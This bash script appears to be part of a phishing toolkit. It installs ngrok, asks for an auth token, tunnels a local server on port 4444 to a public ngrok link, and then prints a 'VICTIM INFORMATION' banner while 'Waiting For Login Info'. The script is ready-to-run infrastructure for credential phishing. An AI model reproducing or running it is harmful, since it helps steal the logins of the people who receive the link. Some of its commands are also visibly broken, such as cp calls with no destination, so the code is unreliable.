#!/bin/bash
echo ""

download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			cp -f $output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			cp -f $output > /dev/null 2>&1
		else
			cp -f $file > /dev/null 2>&1
		fi
		chmod +x $output $file > /dev/null 2>&1
		rm -rf file1
	else
		echo -e "\e[91m Error occured while downloading ${output}."
		{ reset_color; exit 1; }
	fi
}

install_ngrok() {
	if [[ -e "ngrok" ]]; then
		echo -e "\e[91m[\e[92m-\e[91m] \e[96m Ngrok already installed."
	else
		echo -e "\e[91m[\e[92m*\e[91m] \e[96m Installing Ngrok..."
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz' 'ngrok'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz' 'ngrok'
		else
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz' 'ngrok'
		fi
	fi
}

start_ngrok() {
	{ sleep 1; }
	echo -e $" \e[91m[\e[0m-\e[91m]\e[1;92m Launching Ngrok...\e[0m  "
	echo -e "\n"
echo "==========================================================="
echo -e "\e[96mChoose Ngrok Region (for better connection).\e[0m"
echo "==========================================================="
echo -e "us - \e[93mUnited States \e[92m(Ohio)\e[0m"
echo -e "eu - \e[93mEurope \e[92m(Frankfurt)\e[0m"
echo -e "ap - \e[93mAsia/Pacific \e[92m(Singapore)\e[0m"
echo -e "au - \e[93mAustralia \e[92m(Sydney)\e[0m"
echo -e "sa - \e[93mSouth America \e[92m(Sao Paulo)\e[0m"
echo -e "jp - \e[93mJapan \e[92m(Tokyo)\e[0m"
echo -e "in - \e[93mIndia \e[92m(Mumbai)\e[0m"
echo ""
read -p "Choose Ngrok Region: " nRegion
	echo -e ""

	if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./ngrok http --region $nRegion 127.0.0.1:4444 > /dev/null 2>&1 &
	else
		sleep 2 && ./ngrok http --region $nRegion 127.0.0.1:4444 > /dev/null 2>&1 &
	fi

	sleep 8
	nlink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(*.ngrok.io)')

}

links_n() {
                           echo -e "\e[96m=======================\e[92m   SUMAN © 2022 FF  \e[96m=======================\e[92m"
                           echo -e " "
			   echo -e " "
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Ngrok Link :\e[0m\e[1;77m %s\e[0m\n" $nlink                                   
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
			   echo ""
			   echo ""
			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
                           echo ""
			   echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;95m Waiting For Login Info, \e[92mCtrl + C \e[1;95mto Exit...\e[93m "
			   echo ""
}

ngroktoken() {
echo ""
echo -e "\e[93m 
 ███▄    █   ▄████  ██▀███   ▒█████   ██ ▄█▀
 ██ ▀█   █  ██▒ ▀█▒▓██ ▒ ██▒▒██▒  ██▒ ██▄█▒ 
▓██  ▀█ ██▒▒██░▄▄▄░▓██ ░▄█ ▒▒██░  ██▒▓███▄░ 
▓██▒  ▐▌██▒░▓█  ██▓▒██▀▀█▄  ▒██   ██░▓██ █▄ 
▒██░   ▓██░░▒▓███▀▒░██▓ ▒██▒░ ████▓▒░▒██▒ █▄
░ ▒░   ▒ ▒  ░▒   ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒ ▒▒ ▓▒
░ ░░   ░ ▒░  ░   ░   ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░▒ ▒░
   ░   ░ ░ ░ ░   ░   ░░   ░ ░ ░ ░ ▒  ░ ░░ ░ 
         ░       ░    ░         ░ ░  ░  ░   
\e[0m\n"
echo ""
echo ""
read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Want to give \e[96mNgrok \e[32mToken ? \e[1;91m (y/n) : \e[0m' option
echo""
echo""
echo""

if [[ $option == *'y'* ]]; then
clear
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!        Requirement Ngrok Token       !!\e[0m'
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
echo ""
echo""
echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
echo ""
echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & Click Getting Started or Authtoken Button & Copy Auth Token \e[m "
echo ""
read -p $'\e[31m[\e[32m*\e[31m]\e[33m Input AuthToken Only \e[91m[Ex. \e[92m2cEG2LcBt**********WK5Ntc \e[92m] : \e[0m' token
./ngrok config add-authtoken $token
echo ""
fi
if [[ $option == *'n'* ]]; then
clear
fi
}




clear
install_ngrok
chmod +x ngrok
ngroktoken
start_ngrok
links_n
